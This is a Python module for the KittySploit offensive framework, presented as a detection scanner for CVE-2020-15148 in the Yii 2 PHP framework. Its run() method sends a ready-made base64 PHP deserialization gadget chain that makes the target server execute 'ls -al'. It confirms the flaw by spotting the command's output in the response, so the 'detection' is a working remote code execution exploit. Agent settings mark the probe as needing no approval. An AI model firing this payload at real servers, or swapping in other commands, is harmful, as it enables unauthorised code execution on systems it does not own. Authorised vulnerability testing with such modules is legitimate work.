#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yii 2 (yiisoft/yii2) before version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yii 2 < 2.0.38 - Remote Code Execution Detection',
        'description': 'Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls `unserialize()` on arbitrary user input.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'yii', 'yiiframework', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.csdn.net/xuandao_ahfengren/article/details/111259943',
            'https://github.com/nosafer/nosafer.github.io/blob/227a05f5eff69d32a027f15d6106c6d735124659/docs/Web%E5%AE%89%E5%85%A8/Yii2/%EF%BC%88CVE-2020-15148%EF%BC%89Yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99',
            'https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj',
            'https://github.com/20142995/sectool',
        ],
        'cve': 'CVE-2020-15148',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==', allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_all = ('total', 'An internal server error occurred.',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Yii 2 < 2.0.38 - Remote Code Execution detected",
                path='/index.php?r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==',
            )
            return True
        return False

